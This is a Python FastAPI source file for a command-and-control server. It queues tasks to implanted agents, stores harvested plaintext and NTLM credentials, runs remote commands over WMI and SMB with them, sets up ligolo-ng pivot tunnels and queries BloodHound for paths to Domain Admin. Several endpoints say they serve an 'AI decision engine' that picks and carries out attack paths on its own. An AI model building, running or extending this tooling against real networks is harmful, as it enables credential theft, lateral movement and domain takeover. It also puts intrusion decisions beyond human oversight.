from fastapi import FastAPI, HTTPException
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import Optional
import json
import os
from database import init_db, migrate_db, ensure_server_agent, get_conn
from impacket_wrapper import wmi_exec, smb_exec
from pivot_manager import ensure_interface, add_route, del_route
import bloodhound_client as bh

app = FastAPI()

FILES_DIR = os.path.join(os.path.dirname(__file__), "files")
os.makedirs(FILES_DIR, exist_ok=True)
app.mount("/files", StaticFiles(directory=FILES_DIR), name="files")


@app.on_event("startup")
def startup():
    init_db()
    migrate_db()
    ensure_server_agent()


# ── Models ────────────────────────────────────────────────────────────────────

class AgentCheckin(BaseModel):
    agent_id: str
    hostname: str
    username: str

class TaskResult(BaseModel):
    task_id: int
    agent_id: str
    output: str

class NewTask(BaseModel):
    agent_id: str
    instruction: str

class NewRecon(BaseModel):
    agent_id: str
    target: str     # single IP or CIDR (e.g. "10.0.2.5" or "10.0.2.0/24")

class NewCredential(BaseModel):
    agent_id: str
    username: str
    secret: str
    cred_type: str          # e.g. "plaintext", "ntlm", "ticket"
    source_host: str

class ExecRequest(BaseModel):
    target_ip: str
    domain: str = "WORKGROUP"
    command: str
    method: str = "wmi"             # "wmi" or "smb"
    cred_id: Optional[int] = None   # pull creds from loot DB …
    username: Optional[str] = None  # … or supply inline
    secret: Optional[str] = None
    cred_type: str = "plaintext"    # "plaintext" or "ntlm"

class TunnelRegister(BaseModel):
    agent_id:  str
    subnet:    str        # CIDR, e.g. "10.0.2.0/24"
    interface: str = "ligolo"


# ── Agent endpoints ───────────────────────────────────────────────────────────

@app.post("/checkin")
def checkin(data: AgentCheckin):
    with get_conn() as conn:
        # Upsert agent
        conn.execute("""
            INSERT INTO agents (agent_id, hostname, username)
            VALUES (?, ?, ?)
            ON CONFLICT(agent_id) DO UPDATE SET
                last_seen = datetime('now'),
                hostname  = excluded.hostname,
                username  = excluded.username
        """, (data.agent_id, data.hostname, data.username))

        # Grab oldest pending task for this agent
        row = conn.execute("""
            SELECT task_id, task_type, instruction FROM tasks
            WHERE agent_id = ? AND status = 'pending'
            ORDER BY task_id ASC
            LIMIT 1
        """, (data.agent_id,)).fetchone()

        if row:
            conn.execute(
                "UPDATE tasks SET status = 'sent' WHERE task_id = ?",
                (row["task_id"],)
            )
            print(f"[*] Check-in: {data.username}@{data.hostname} → task {row['task_id']} [{row['task_type']}]: {row['instruction']}")
            return {"task_id": row["task_id"], "task_type": row["task_type"], "instruction": row["instruction"]}

    print(f"[*] Check-in: {data.username}@{data.hostname} — no tasks queued")
    return {"task_id": None, "task_type": None, "instruction": None}


@app.post("/result")
def receive_result(data: TaskResult):
    with get_conn() as conn:
        task = conn.execute(
            "SELECT task_id, task_type FROM tasks WHERE task_id = ? AND agent_id = ?",
            (data.task_id, data.agent_id)
        ).fetchone()
        if not task:
            raise HTTPException(status_code=404, detail="Task not found")

        conn.execute(
            "UPDATE tasks SET status = 'completed' WHERE task_id = ?",
            (data.task_id,)
        )
        conn.execute(
            "INSERT INTO results (task_id, agent_id, output) VALUES (?, ?, ?)",
            (data.task_id, data.agent_id, data.output)
        )

        if task["task_type"] == "recon":
            _store_recon_hosts(conn, data.agent_id, data.output)

    print(f"[+] Result for task {data.task_id} [{task['task_type']}] from {data.agent_id}:\n{data.output}")
    return {"status": "ok"}


def _store_recon_hosts(conn, agent_id: str, output: str):
    try:
        data = json.loads(output)
        for host in data.get("hosts", []):
            port_list = host.get("ports", [])
            open_ports = ",".join(str(p["port"]) for p in port_list)
            services   = json.dumps(port_list)
            hostname   = host.get("hostname", "")
            conn.execute("""
                INSERT INTO hosts (ip, hostname, open_ports, services, discovered_by)
                VALUES (?, ?, ?, ?, ?)
                ON CONFLICT(ip) DO UPDATE SET
                    hostname      = excluded.hostname,
                    open_ports    = excluded.open_ports,
                    services      = excluded.services,
                    discovered_by = excluded.discovered_by,
                    discovered_at = datetime('now')
            """, (host["ip"], hostname, open_ports, services, agent_id))
        print(f"[+] Recon stored {len(data.get('hosts', []))} hosts")
    except Exception as e:
        print(f"[-] Failed to parse recon result: {e}")


# ── Operator endpoints ────────────────────────────────────────────────────────

@app.get("/agents")
def list_agents():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()
    return [dict(r) for r in rows]


@app.post("/task")
def queue_task(data: NewTask):
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

        cur = conn.execute(
            "INSERT INTO tasks (agent_id, instruction) VALUES (?, ?)",
            (data.agent_id, data.instruction)
        )
    print(f"[*] Task queued for {data.agent_id}: {data.instruction}")
    return {"task_id": cur.lastrowid, "status": "queued"}


@app.get("/results/{agent_id}")
def get_results(agent_id: str):
    with get_conn() as conn:
        rows = conn.execute("""
            SELECT r.result_id, r.task_id, t.instruction, r.output, r.received_at
            FROM results r
            JOIN tasks t ON r.task_id = t.task_id
            WHERE r.agent_id = ?
            ORDER BY r.received_at DESC
        """, (agent_id,)).fetchall()
    return [dict(r) for r in rows]


@app.post("/recon")
def queue_recon(data: NewRecon):
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

        cur = conn.execute(
            "INSERT INTO tasks (agent_id, task_type, instruction) VALUES (?, 'recon', ?)",
            (data.agent_id, data.target)
        )
    print(f"[*] Recon task queued for {data.agent_id}: {data.target}")
    return {"task_id": cur.lastrowid, "status": "queued"}


@app.get("/hosts")
def list_hosts():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM hosts ORDER BY discovered_at DESC").fetchall()
    return [dict(r) for r in rows]


@app.post("/credentials")
def store_credential(data: NewCredential):
    with get_conn() as conn:
        conn.execute("""
            INSERT INTO credentials (agent_id, username, secret, cred_type, source_host)
            VALUES (?, ?, ?, ?, ?)
        """, (data.agent_id, data.username, data.secret, data.cred_type, data.source_host))
    print(f"[+] Credential stored: {data.username} ({data.cred_type}) from {data.source_host}")
    return {"status": "ok"}


@app.get("/credentials")
def list_credentials():
    with get_conn() as conn:
        rows = conn.execute("SELECT * FROM credentials ORDER BY harvested_at DESC").fetchall()
    return [dict(r) for r in rows]


@app.post("/exec")
def remote_exec(data: ExecRequest):
    # ── Resolve credentials ───────────────────────────────────────────────────
    if data.cred_id is not None:
        with get_conn() as conn:
            cred = conn.execute(
                "SELECT username, secret, cred_type FROM credentials WHERE cred_id = ?",
                (data.cred_id,)
            ).fetchone()
        if not cred:
            raise HTTPException(status_code=404, detail="Credential not found")
        username  = cred["username"]
        secret    = cred["secret"]
        cred_type = cred["cred_type"]
    elif data.username and data.secret:
        username  = data.username
        secret    = data.secret
        cred_type = data.cred_type
    else:
        raise HTTPException(status_code=400, detail="Provide cred_id or username+secret")

    # ── Execute ───────────────────────────────────────────────────────────────
    EXEC_METHODS = {"wmi": wmi_exec, "smb": smb_exec}
    if data.method not in EXEC_METHODS:
        raise HTTPException(status_code=400, detail="method must be 'wmi' or 'smb'")

    output = EXEC_METHODS[data.method](
        data.target_ip, data.domain, username, secret, data.command, cred_type
    )

    # ── Store result ──────────────────────────────────────────────────────────
    with get_conn() as conn:
        cur = conn.execute(
            "INSERT INTO tasks (agent_id, task_type, instruction, status) VALUES ('server', 'exec', ?, 'completed')",
            (f"{data.method}://{data.target_ip} -> {data.command}",)
        )
        task_id = cur.lastrowid
        conn.execute(
            "INSERT INTO results (task_id, agent_id, output) VALUES (?, 'server', ?)",
            (task_id, output)
        )

    print(f"[+] Exec [{data.method}] on {data.target_ip}: {data.command}\n{output}")
    return {"task_id": task_id, "target": data.target_ip, "method": data.method, "output": output}


# ── Pivot endpoints ───────────────────────────────────────────────────────────

@app.post("/pivot/tunnel")
def register_tunnel(data: TunnelRegister):
    """
    Register a ligolo-ng tunnel after the operator has connected the session
    in the ligolo-ng console (session → start). Automatically adds the kernel
    route so all tools on the operator machine can reach the target subnet.
    """
    with get_conn() as conn:
        agent = conn.execute(
            "SELECT agent_id FROM agents WHERE agent_id = ?", (data.agent_id,)
        ).fetchone()
        if not agent:
            raise HTTPException(status_code=404, detail="Agent not found")

    iface = ensure_interface(data.interface)
    if not iface["ok"]:
        raise HTTPException(status_code=500, detail=f"Failed to create interface: {iface['error']}")
    if iface["created"]:
        print(f"[*] TUN interface '{data.interface}' created")

    route = add_route(data.subnet, data.interface)
    if not route["ok"]:
        raise HTTPException(status_code=500, detail=f"Failed to add route: {route['error']}")

    with get_conn() as conn:
        cur = conn.execute(
            "INSERT INTO tunnels (agent_id, interface, subnet) VALUES (?, ?, ?)",
            (data.agent_id, data.interface, data.subnet)
        )
        tunnel_id = cur.lastrowid

    print(f"[+] Tunnel registered: {data.subnet} via {data.interface} (agent: {data.agent_id})")
    return {"tunnel_id": tunnel_id, "agent_id": data.agent_id,
            "subnet": data.subnet, "interface": data.interface, "status": "active"}


@app.delete("/pivot/tunnel/{tunnel_id}")
def remove_tunnel(tunnel_id: int):
    """
    Mark a tunnel as down and remove the kernel route.
    Call this when the ligolo-ng agent disconnects or the pivot is no longer needed.
    """
    with get_conn() as conn:
        tunnel = conn.execute(
            "SELECT * FROM tunnels WHERE tunnel_id = ?", (tunnel_id,)
        ).fetchone()
        if not tunnel:
            raise HTTPException(status_code=404, detail="Tunnel not found")

        del_route(tunnel["subnet"], tunnel["interface"])

        conn.execute(
            "UPDATE tunnels SET status = 'down' WHERE tunnel_id = ?", (tunnel_id,)
        )

    print(f"[*] Tunnel {tunnel_id} torn down ({tunnel['subnet']} via {tunnel['interface']})")
    return {"tunnel_id": tunnel_id, "status": "down"}


@app.get("/pivot/tunnels")
def list_tunnels():
    with get_conn() as conn:
        rows = conn.execute(
            "SELECT * FROM tunnels ORDER BY created_at DESC"
        ).fetchall()
    return [dict(r) for r in rows]


# ── BloodHound / Neo4j endpoints ──────────────────────────────────────────────

class CypherQuery(BaseModel):
    cypher: str
    params: dict = {}

class AttackPathSave(BaseModel):
    start_node: str
    end_node:   str
    path_json:  str   # JSON-serialized steps list
    length:     int

class AttackPathUpdate(BaseModel):
    status: str        # planned / in_progress / completed / failed
    notes:  str = ""


@app.get("/bloodhound/status")
def bloodhound_status():
    return bh.check_connection()


@app.post("/bloodhound/query")
def bloodhound_query(data: CypherQuery):
    """Run arbitrary Cypher against Neo4j. Primary interface for the AI decision engine."""
    try:
        results = bh.run_query(data.cypher, data.params)
        return {"results": results, "count": len(results)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/bloodhound/da-paths")
def bloodhound_da_paths(username: str, domain: str = "ICCN.LOCAL"):
    """Shortest paths from a node to Domain Admins."""
    try:
        paths = bh.get_da_paths(username, domain)
        return {"username": username, "domain": domain, "paths": paths, "count": len(paths)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/bloodhound/owned-paths")
def bloodhound_owned_paths(domain: str = "ICCN.LOCAL"):
    """Shortest paths to DA from all nodes currently in the credentials table."""
    with get_conn() as conn:
        rows = conn.execute("SELECT DISTINCT username FROM credentials").fetchall()
    owned = [r["username"] for r in rows]
    if not owned:
        return {"paths": [], "count": 0}
    try:
        paths = bh.get_owned_paths(owned, domain)
        return {"owned_nodes": owned, "domain": domain, "paths": paths, "count": len(paths)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/bloodhound/admins")
def bloodhound_admin_targets(username: str):
    """Computers where username has AdminTo rights."""
    try:
        return {"username": username, "admin_targets": bh.get_admin_targets(username)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/bloodhound/sessions")
def bloodhound_sessions(computer: str):
    """Users with active sessions on a computer."""
    try:
        return {"computer": computer, "sessions": bh.get_sessions(computer)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/bloodhound/kerberoastable")
def bloodhound_kerberoastable(domain: str = "ICCN.LOCAL"):
    try:
        return {"domain": domain, "accounts": bh.get_kerberoastable(domain)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.get("/bloodhound/asreproastable")
def bloodhound_asreproastable(domain: str = "ICCN.LOCAL"):
    try:
        return {"domain": domain, "accounts": bh.get_asreproastable(domain)}
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))


@app.post("/bloodhound/sync")
def bloodhound_sync():
    """
    Dump every BloodHound node and relationship into the loot DB.
    Re-runnable — upserts on conflict so re-syncing refreshes stale data.
    """
    try:
        data = bh.sync_all()
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))

    nodes_count = 0
    edges_count = 0

    with get_conn() as conn:
        for node in data["nodes"]:
            if not node.get("name"):
                continue
            conn.execute("""
                INSERT INTO bh_nodes (name, node_type, properties)
                VALUES (?, ?, ?)
                ON CONFLICT(name, node_type) DO UPDATE SET
                    properties = excluded.properties,
                    synced_at  = datetime('now')
            """, (node["name"], node.get("node_type") or "Unknown",
                  json.dumps(node.get("props", {}))))
            nodes_count += 1

        for edge in data["edges"]:
            if not edge.get("source_name") or not edge.get("target_name"):
                continue
            conn.execute("""
                INSERT INTO bh_edges (source_name, source_type, rel_type, target_name, target_type, properties)
                VALUES (?, ?, ?, ?, ?, ?)
                ON CONFLICT(source_name, rel_type, target_name) DO UPDATE SET
                    properties = excluded.properties,
                    synced_at  = datetime('now')
            """, (edge["source_name"], edge.get("source_type") or "Unknown",
                  edge["rel_type"],
                  edge["target_name"], edge.get("target_type") or "Unknown",
                  json.dumps(edge.get("rel_props", {}))))
            edges_count += 1

    print(f"[+] BloodHound sync: {nodes_count} nodes, {edges_count} edges")
    return {"nodes_synced": nodes_count, "edges_synced": edges_count}


# ── BloodHound loot DB read endpoints (for the AI) ────────────────────────────

@app.get("/bh/nodes")
def get_bh_nodes(node_type: Optional[str] = None, name: Optional[str] = None):
    """Query stored BloodHound nodes. Filter by type (User/Computer/Group/Domain) or name."""
    with get_conn() as conn:
        query  = "SELECT * FROM bh_nodes WHERE 1=1"
        params = []
        if node_type:
            query += " AND node_type = ?"
            params.append(node_type)
        if name:
            query += " AND name LIKE ?"
            params.append(f"%{name}%")
        rows = conn.execute(query, params).fetchall()
    return [dict(r) for r in rows]


@app.get("/bh/edges")
def get_bh_edges(
    rel_type:    Optional[str] = None,
    source_name: Optional[str] = None,
    target_name: Optional[str] = None,
    source_type: Optional[str] = None,
    target_type: Optional[str] = None,
):
    """Query stored BloodHound relationships. Supports filtering on any field."""
    with get_conn() as conn:
        query  = "SELECT * FROM bh_edges WHERE 1=1"
        params = []
        for col, val in [
            ("rel_type",    rel_type),
            ("source_name", source_name),
            ("target_name", target_name),
            ("source_type", source_type),
            ("target_type", target_type),
        ]:
            if val:
                query += f" AND {col} = ?"
                params.append(val)
        rows = conn.execute(query, params).fetchall()
    return [dict(r) for r in rows]


@app.get("/bh/owned-edges")
def get_owned_edges():
    """
    All BloodHound edges where the source node matches a credential in the loot DB.
    Normalizes stored usernames to USER@DOMAIN format for matching.
    """
    with get_conn() as conn:
        creds = conn.execute(
            "SELECT DISTINCT username FROM credentials"
        ).fetchall()

        if not creds:
            return []

        # Extract just the username part from BH node names (before the @)
        # and compare case-insensitively
        usernames = [r["username"].upper() for r in creds]
        placeholders = ",".join("?" * len(usernames))
        rows = conn.execute(f"""
            SELECT e.* FROM bh_edges e
            WHERE upper(substr(e.source_name, 1,
                  CASE WHEN instr(e.source_name, '@') > 0
                       THEN instr(e.source_name, '@') - 1
                       ELSE length(e.source_name) END
                  )) IN ({placeholders})
            ORDER BY e.rel_type, e.target_name
        """, usernames).fetchall()

    return [dict(r) for r in rows]


# ── Attack path working memory (AI state) ─────────────────────────────────────

@app.post("/attack_paths")
def save_attack_path(data: AttackPathSave):
    """AI stores a path it has decided to pursue."""
    with get_conn() as conn:
        cur = conn.execute(
            "INSERT INTO attack_paths (start_node, end_node, path_json, length) VALUES (?, ?, ?, ?)",
            (data.start_node, data.end_node, data.path_json, data.length)
        )
    return {"path_id": cur.lastrowid, "status": "planned"}


@app.get("/attack_paths")
def list_attack_paths(status: Optional[str] = None):
    """Read stored attack paths. Filter by status if provided."""
    with get_conn() as conn:
        if status:
            rows = conn.execute(
                "SELECT * FROM attack_paths WHERE status = ? ORDER BY saved_at DESC", (status,)
            ).fetchall()
        else:
            rows = conn.execute(
                "SELECT * FROM attack_paths ORDER BY saved_at DESC"
            ).fetchall()
    return [dict(r) for r in rows]


@app.patch("/attack_paths/{path_id}")
def update_attack_path(path_id: int, data: AttackPathUpdate):
    """AI updates the status of a path it is executing (planned→in_progress→completed/failed)."""
    valid = {"planned", "in_progress", "completed", "failed"}
    if data.status not in valid:
        raise HTTPException(status_code=400, detail=f"status must be one of {valid}")
    with get_conn() as conn:
        updated = conn.execute(
            "UPDATE attack_paths SET status = ?, notes = ? WHERE path_id = ?",
            (data.status, data.notes, path_id)
        ).rowcount
    if not updated:
        raise HTTPException(status_code=404, detail="Path not found")
    return {"path_id": path_id, "status": data.status}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8080)
